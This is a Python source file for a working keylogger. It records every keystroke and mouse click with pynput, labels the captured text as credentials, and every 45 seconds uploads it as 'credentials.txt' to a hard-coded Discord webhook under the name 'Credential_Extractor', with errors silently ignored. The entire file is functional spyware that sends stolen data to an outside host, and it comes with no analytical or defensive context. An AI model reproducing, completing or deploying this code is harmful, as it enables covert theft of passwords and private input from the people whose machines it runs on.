import pynput.keyboard
import pynput.mouse
import requests
import threading
import time
import os

# --- Configuration ---
# Your provided Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1465626136330502288/KaPOIOxShd9sMrmLq33ck2kAFmW1eWx4SN6ZdZmFBWOHWtl1QMoKIdG1KfJaIyZnLo9s"
# Name to appear on the Discord webhook
SENDER_NAME = "Credential_Extractor" 
# Time interval (in seconds) between log dumps
SEND_INTERVAL = 45 # Slightly shorter interval for quicker credential capture

# Global variables for the log buffer and thread safety
log_buffer = ""
log_lock = threading.Lock()
stop_event = threading.Event()

def send_message(content):
    """Sends the batched log content."""
    
    # We use a file-like payload to send large logs
    payload = {
        "username": SENDER_NAME,
        "content": f"Credential Log Dump | Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    }

    # Format the content as a file
    files = {
        'log_file': ('credentials.txt', content)
    }
    
    try:
        requests.post(WEBHOOK_URL, data=payload, files=files, timeout=10)
    except requests.exceptions.RequestException:
        pass # Silently fail

def processing_worker():
    """Worker thread that periodically sends the accumulated log."""
    global log_buffer
    
    while not stop_event.is_set():
        stop_event.wait(timeout=SEND_INTERVAL)
        content_to_send = ""

        with log_lock:
            if log_buffer:
                content_to_send = log_buffer
                log_buffer = "" 

        if content_to_send:
            send_message(content_to_send)

def log_input(text):
    """Appends text to the global buffer."""
    global log_buffer
    
    with log_lock:
        log_buffer += text

def on_press(key):
    """Callback function executed when a key is pressed."""
    
    try:
        # Printable character: This is the actual password character.
        log_input(key.char)
        
    except AttributeError:
        # Special key handling
        
        if key == pynput.keyboard.Key.space:
            log_input(" ")
        elif key == pynput.keyboard.Key.enter:
            # Log ENTER with a timestamp and newline for clear credential separation
            timestamp = time.strftime('[%H:%M:%S]')
            log_input(f"\n{timestamp}[ENTER - SUBMIT]\n") 
        elif key == pynput.keyboard.Key.tab:
            log_input("[TAB]")
        elif key == pynput.keyboard.Key.backspace:
            log_input("[BACKSPACE]")
        elif key in [pynput.keyboard.Key.shift, pynput.keyboard.Key.ctrl, pynput.keyboard.Key.alt]:
            # Ignore simple presses of modifier keys for cleaner logs
            return
        else:
            # Log other functional keys
            key_name = str(key).split('.')[-1].upper()
            log_input(f"[{key_name}]")

def on_click(x, y, button, pressed):
    """Callback function for mouse clicks."""
    
    if pressed:
        # Log the click event to mark the start/end of a data entry session
        timestamp = time.strftime('[%H:%M:%S]')
        button_name = str(button).split('.')[-1].upper()
        log_input(f"\n{timestamp}[MOUSE_CLICK - {button_name} @ ({x}, {y})] ")


# --- Main Execution ---
if __name__ == "__main__":
    
    # 1. Start the periodic sending worker thread
    worker_thread = threading.Thread(target=processing_worker)
    worker_thread.daemon = True 
    worker_thread.start()

    # 2. Start the keyboard listener (only logging on_press for characters)
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    keyboard_listener.daemon = True
    keyboard_listener.start()

    # 3. Start the mouse listener (logging click for context)
    mouse_listener = pynput.mouse.Listener(on_click=on_click)
    mouse_listener.daemon = True
    mouse_listener.start()
    
    try:
        # Keep the main thread alive indefinitely
        while True:
            time.sleep(1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception:
        pass
    finally:
        # Clean shutdown sequence
        stop_event.set()
        keyboard_listener.stop()
        mouse_listener.stop()
        
        worker_thread.join(timeout=SEND_INTERVAL + 5) 

        # Final log dump
        with log_lock:
            if log_buffer:
                send_message("FINAL LOG DUMP:\n" + log_buffer)